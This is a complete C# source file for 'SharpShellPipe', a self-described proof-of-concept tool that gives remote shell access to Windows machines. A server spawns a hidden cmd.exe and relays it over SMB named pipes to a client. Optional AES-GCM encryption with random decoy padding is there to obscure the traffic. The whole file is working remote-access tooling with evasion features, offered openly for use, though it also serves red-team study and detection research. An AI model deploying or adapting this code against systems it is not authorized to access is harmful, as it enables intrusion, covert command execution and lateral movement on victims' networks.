/*
 * =========================================================================================
 * Project:       SharpShellPipe
 * 
 * Description:   SharpShellPipe is a minimal C# example that showcases the use of Windows
 *                named pipes for gaining remote shell access to either a local or a distant
 *                Windows machine.
 * 
 * Author:        Jean-Pierre LESUEUR (@DarkCoderSc)
 * Email:         jplesueur@phrozen.io
 * Website:       https://www.phrozen.io
 * GitHub:        https://github.com/DarkCoderSc
 * Twitter:       https://twitter.com/DarkCoderSc
 * License:       Apache-2.0
 * 
 * By using this code, the user agrees to indemnify and hold Jean-Pierre LESUEUR and 
 * PHROZEN SAS harmless from any and all claims, liabilities, costs, and expenses arising
 * from the use, misuse, or distribution of this code. The user also agrees not to hold 
 * Jean-Pierre LESUEUR or PHROZEN SAS responsible for any errors or omissions in the code,
 * and to take full responsibility for ensuring that the code meets the user's needs.
 * 
 * =========================================================================================
 */

using System.Diagnostics;
using System.IO.Pipes;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;

class Program
{
    public static byte[]? EncryptionKey;

    // Program Configuration Begin ++++++++++++++++++++++++++++++++++++++++++++++++++++
    public const string NamedPipePrefix = "DCSC";
    // Replace passphrase with null or empty string to disable traffic encryption
    public const string? EncryptionPassphrase = null; // "p4ssw0rd!";
    // Program Configuration End ++++++++++++++++++++++++++++++++++++++++++++++++++++++

    public const string StdOutPipeName = $"{NamedPipePrefix}_stdOutPipe";
    public const string StdInPipeName = $"{NamedPipePrefix}_stdInPipe";

    /// <summary>
    /// Writes a verbose message to the screen, displayed in yellow text along with a small icon to
    /// signify the nature of the output message.
    /// </summary>
    /// <param name="message"></param>
    /// <param name="icon"></param>
    public static void WriteVerbose(string message, char icon)
    {
        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine($"[{icon}] {message}");
        Console.ResetColor();
    }

    /// <summary>
    /// The Encrypted Bundle includes both the ciphertext and the associated information required for
    /// decryption. The Nonce and Tag are specifically used in conjunction with AES GCM mode.
    /// The Nonce is used during the decryption process, while the Tag serves as part of the
    /// authentication mechanism in GCM mode. The Salt is used in the AES passphrase derivation process,
    /// adding complexity and ensuring that the AES key is unique across different encryption 
    /// iterations.
    /// </summary>
    protected class EncryptedBundle
    {
        public byte[] Data { get; set; }
        public byte[] Nonce { get; set; }
        public byte[] Tag { get; set; }
        public byte[] Salt { get; set; }
    }

    /// <summary>
    /// The Encrypted Packet Class holds the plaintext data; in our Proof of Concept (PoC), this
    /// is represented by a single character stored as an integer in the Data field. Dummy1 and Dummy2
    /// are decoys introduced to increase the entropy of the Encrypted Packet Class content. Because of
    /// these variables, the size and content of an Encrypted Packet will differ with each iteration,
    /// thereby adding an additional layer of obfuscation to its potential nature once encrypted.
    /// </summary>
    protected class EncryptedPacket
    {
        public byte[] Dummy1 { get; set; }
        public int Data { get; set; }
        public byte[] Dummy2 { get; set; }
    }

    /// <summary>
    /// This method derives a 256-bit key suitable for our AES encryption from the given passphrase.
    /// If no salt is provided, the function generates and returns a random 256-bit salt. Note
    /// that the iteration count is set to 1000; although this may seem low, it is more than
    /// sufficient for our Proof of Concept (PoC). Increasing this value will significantly 
    /// slow down the encryption process for each data chunk/packet. This is particularly important
    /// to consider because in our setup, shell output is sent character by character, and each 
    /// character undergoes passphrase derivation with a new random salt.
    /// </summary>
    /// <param name="passphrase"></param>
    /// <param name="salt"></param>
    /// <returns></returns>
    public static (byte[], byte[]) SetupEncryptionKey(string passphrase, byte[]? salt = null)
    {
        if (salt == null)
        {
            salt = new byte[32]; // 256-bit salt

            // https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.randomnumbergenerator?view=net-7.0?WT_mc_id=SEC-MVP-5005282
            using RandomNumberGenerator randomGenerator = RandomNumberGenerator.Create();

            randomGenerator.GetBytes(salt);
        }

        using Rfc2898DeriveBytes pbkdf2 = new(passphrase, salt, 1000);

        return (pbkdf2.GetBytes(32), salt); // 256-bit key
    }

    /// <summary>
    /// This method generates a byte array with both a random size and random content. 
    /// This is used to populate the decoy fields (Dummy1 and Dummy2) in our Encrypted Packet Class.
    /// You can adjust the minimum and maximum size limits to control the range of variability for
    /// the generated array.
    /// </summary>
    /// <returns></returns>
    public static byte[] RandomBytes(uint sizeMinTolerence = 32, uint sizeMaxTolerence = 1024)
    {
        // https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.randomnumbergenerator?view=net-7.0?WT_mc_id=SEC-MVP-5005282
        using RandomNumberGenerator randomGenerator = RandomNumberGenerator.Create();

        byte[] randomArraySizeCandidate = new byte[4]; // sizeof(uint)

        uint randomArraySize = 0;

        randomGenerator.GetBytes(randomArraySizeCandidate);

        randomArraySize = sizeMinTolerence +
            (BitConverter.ToUInt32(randomArraySizeCandidate, 0) % (sizeMaxTolerence - sizeMinTolerence + 1));

        byte[] randomBytes = new byte[randomArraySize];

        randomGenerator.GetBytes(randomBytes);

        return randomBytes;
    }

    /// <summary>
    /// Unlike our previous Proof of Concept (PoC) using FtpC2, in this iteration, we will demonstrate
    /// an alternative encryption technique. Instead of employing both RSA and AES,
    /// we will use just a shared passphrase for encryption.
    /// </summary>
    /// <param name="b"></param>
    /// <param name="encryptionKey"></param>
    /// <returns></returns>
    public static string Encrypt(int b)
    {
        (byte[] encryptionKey, byte[] salt) = SetupEncryptionKey(EncryptionPassphrase);

        // https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.randomnumbergenerator?view=net-7.0?WT_mc_id=SEC-MVP-5005282
        using RandomNumberGenerator randomGenerator = RandomNumberGenerator.Create();

        // Generate a one-time secure random nonce(usually 12 byte / 96 bits)
        // Generating a random nonce is discouraged due to the risk of nonce + same key collision (which is generally very unlikely)
        // For this PoC, we will ignore this best practice since the risk is very low.
        byte[] nonce = new byte[AesGcm.NonceByteSizes.MaxSize];
        randomGenerator.GetBytes(nonce);

        byte[] tag = new byte[AesGcm.TagByteSizes.MaxSize];

        byte[] dummy1 = RandomBytes();
        byte[] dummy2 = RandomBytes();

        EncryptedPacket encryptedPacket = new()
        {
            Dummy1 = dummy1,
            Data = b,
            Dummy2 = dummy2,
        };

        string data = JsonSerializer.Serialize(encryptedPacket);

        // https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.aesgcm?view=net-7.0?WT_mc_id=SEC-MVP-5005282
        using AesGcm aes = new(encryptionKey);

        byte[] plainText = Encoding.UTF8.GetBytes(data);
        byte[] cipherText = new byte[plainText.Length];

        // Encrypt plain-text using our setup, an authentication tag will get returned.
        // https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.aesgcm.encrypt?view=net-7.0
        aes.Encrypt(nonce, plainText, cipherText, tag);

        EncryptedBundle encryptedBundle = new()
        {
            Data = cipherText,
            Nonce = nonce,
            Tag = tag,
            Salt = salt,
        };

        return JsonSerializer.Serialize(encryptedBundle);
    }

    /// <summary>
    /// This method reverses the encryption process. It requires the Encrypted Bundle to be supplied as a JSON string.
    /// If the decryption process and all its associated steps are successful, the method will return the
    /// decrypted plaintext, represented as a single character.
    /// </summary>
    /// <param name="encryptedData"></param>
    /// <param name="encryptionKey"></param>
    /// <returns></returns>
    public static char Decrypt(string encryptedData)
    {
        EncryptedBundle? encryptedBundle = JsonSerializer.Deserialize<EncryptedBundle>(encryptedData);
        if (encryptedBundle == null)
            return (char)0;

        (byte[] encryptionKey, _) = SetupEncryptionKey(EncryptionPassphrase, encryptedBundle.Salt);

        byte[] plainText = new byte[encryptedBundle.Data.Length];

        // https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.aesgcm?view=net-7.0?WT_mc_id=SEC-MVP-5005282
        using AesGcm aes = new(encryptionKey);

        // https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.aesgcm.decrypt?view=net-7.0?WT_mc_id=SEC-MVP-5005282
        aes.Decrypt(encryptedBundle.Nonce, encryptedBundle.Data, encryptedBundle.Tag, plainText);

        EncryptedPacket? encryptedPacket = JsonSerializer.Deserialize<EncryptedPacket>(plainText);
        if (encryptedPacket == null)
            return (char)0;

        return (char)encryptedPacket.Data;
    }

    /// <summary>
    /// This method sets up the shell server using two named pipes: one for receiving shell commands from the client,
    /// and another for sending shell 'stdout' content character by character. While other techniques exist that may
    /// be more or less optimized than sending stream output character by character, this Proof of Concept (PoC) has
    /// the advantage of being highly stable and easy to understand. You're welcome to optimize the mechanism according
    /// to your own preferences.    
    /// </summary>
    public static void ShellPipeServer()
    {
        while (true)
        {
            // https://learn.microsoft.com/en-us/dotnet/api/system.io.pipes.namedpipeserverstream?view=net-7.0?WT_mc_id=SEC-MVP-5005282
            using NamedPipeServerStream stdOutPipe = new(StdOutPipeName, PipeDirection.Out);
            using NamedPipeServerStream stdInPipe = new(StdInPipeName, PipeDirection.In);

            WriteVerbose("Waiting for peer...", '*');

            stdOutPipe.WaitForConnection();
            stdInPipe.WaitForConnection();
            ///                                  

            WriteVerbose("Peer connected!", '+');

            // https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo?view=net-7.0?WT_mc_id=SEC-MVP-5005282
            ProcessStartInfo processStartInfo = new()
            {
                FileName = "cmd.exe",
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            };

            using Process shell = new() { StartInfo = processStartInfo };

            shell.Start();

            WriteVerbose("Shell spawned!", '+');

            Thread stdOutThread = new(() =>
            {
                try
                {
                    using StreamWriter writer = new(stdOutPipe) { AutoFlush = true };

                    int b;
                    while ((b = shell.StandardOutput.Read()) != -1)
                    {
                        if (!String.IsNullOrEmpty(EncryptionPassphrase))
                        {
                            string encryptedData = Encrypt(b);

                            writer.WriteLine(encryptedData);
                        }
                        else
                            writer.Write((char)b);
                    }
                }
                catch { }
            });
            stdOutThread.Start();

            Thread stdInThread = new(() =>
            {
                try
                {
                    using StreamReader reader = new(stdInPipe);
                    ///

                    if (!String.IsNullOrEmpty(EncryptionPassphrase))
                    {
                        string? encryptedData;
                        char plainChar;

                        while ((encryptedData = reader.ReadLine()) != null)
                        {
                            plainChar = Decrypt(encryptedData);
                            if (plainChar != '\0')
                                shell.StandardInput.Write(plainChar);
                        }
                    }
                    else
                    {
                        int b;
                        while ((b = reader.Read()) != -1)
                            shell.StandardInput.Write((char)b);
                    }
                }
                catch { }
            });
            stdInThread.Start();

            while (true)
            {
                if (!stdOutPipe.IsConnected || !stdInPipe.IsConnected || shell.HasExited)
                    break;

                ///
                Thread.Sleep(100);
            }

            if (!shell.HasExited)
                shell.Kill();

            ///          
            stdOutThread.Join();
            stdInThread.Join();

            ///
            WriteVerbose("Peer disconnected!", '!');
        }
    }

    /// <summary>
    /// This method establishes a connection to the server using two expected client named pipes: 
    /// one for receiving shell output and another for transmitting shell commands. Communication 
    /// between the client and server is facilitated over Named Pipes using the 
    /// Server Message Block (SMB) protocol.
    /// </summary>
    public static void ShellPipeClient(string? serverComputerName)
    {
        if (String.IsNullOrEmpty(serverComputerName))
            serverComputerName = ".";
        ///

        using NamedPipeClientStream pipeStdout = new(serverComputerName, StdOutPipeName, PipeDirection.In);
        using NamedPipeClientStream pipeStdin = new(serverComputerName, StdInPipeName, PipeDirection.Out);

        WriteVerbose("Connecting to remote system...", '*');

        pipeStdout.Connect();
        pipeStdin.Connect();

        WriteVerbose("Successfully connected, spawning shell...", '+');

        int b;
        Thread stdOutThread = new(() =>
        {
            try
            {
                using StreamReader reader = new(pipeStdout);
                ///

                if (!String.IsNullOrEmpty(EncryptionPassphrase))
                {
                    string? encryptedData;
                    char plainChar;

                    while ((encryptedData = reader.ReadLine()) != null)
                    {
                        plainChar = Decrypt(encryptedData);
                        if (plainChar != '\0')
                            Console.Write(plainChar);
                    }
                }
                else
                {
                    while ((b = reader.Read()) != -1)
                        Console.Write((char)b);
                }
            }
            catch { }
        });
        stdOutThread.Start();

        using StreamWriter writer = new(pipeStdin) { AutoFlush = true };

        while (true)
        {
            if (!pipeStdout.IsConnected)
                break;

            string? cmd = Console.ReadLine();
            if (cmd == null)
                continue;
            ///            

            if (!pipeStdin.IsConnected || !pipeStdout.IsConnected)
                break;

            if (EncryptionPassphrase != null)
            {
                foreach (char c in cmd + "\r\n")
                    writer.WriteLine(Encrypt(c));
            }
            else
                writer.WriteLine(cmd);

            ///
            if (cmd.Equals("exit", StringComparison.OrdinalIgnoreCase))
                Thread.Sleep(1000);
        }

        pipeStdout.Close();

        stdOutThread.Join();

        ///
        WriteVerbose("Session with remote host is now terminated.", '!');
    }

    /// <summary>
    /// Program Entrypoint
    /// </summary>
    /// <param name="args"></param>
    public static void Main(string[] args)
    {
        bool server = true;
        foreach (string arg in args)
        {
            if (arg == "--client")
            {
                server = false;

                break;
            }
        }

        if (server) // Default
            ShellPipeServer();
        else
        {
            Console.Write("Please write target computer name (Default: local): ");
            string? serverComputerName = Console.ReadLine();

            ShellPipeClient(serverComputerName);
        }
    }
}